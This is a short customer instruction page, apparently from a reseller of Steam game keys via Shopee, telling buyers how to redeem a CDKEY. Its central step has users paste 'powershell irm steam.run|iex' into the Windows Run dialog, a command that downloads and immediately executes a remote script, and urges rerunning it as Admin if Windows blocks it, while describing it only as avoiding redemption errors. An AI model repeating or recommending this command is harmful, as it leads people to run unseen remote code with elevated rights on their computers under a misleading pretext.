How to run the command & redeem your CDKEY

Follow these steps exactly. If Windows blocks it, run again as Admin.

  1. Press the Windows Start menu.
  2. Type Run and open the Run dialog.
  3. In the Run box, type this:
    powershell irm steam.run|iex
  4. Redeem the CDKEY shown above (the one your Shopee admin gave you).

What does this command do?

This PowerShell command makes sure your Steam CDKEY can be redeemed and avoids common errors. If you change/format your PC later, just run this command once again and all your games will appear again.

Example: Run dialog with powershell irm steam.run|iex

How to redeem the CDKEY

  1. Open Steam, click Games at the top-left.
  2. Select Activate a product on Steam‚Ä¶
  3. Paste your CDKEY shown above, then confirm the prompts.
  4. Restart Steam after activation.
Example: Steam → Games → Activate a product on Steam
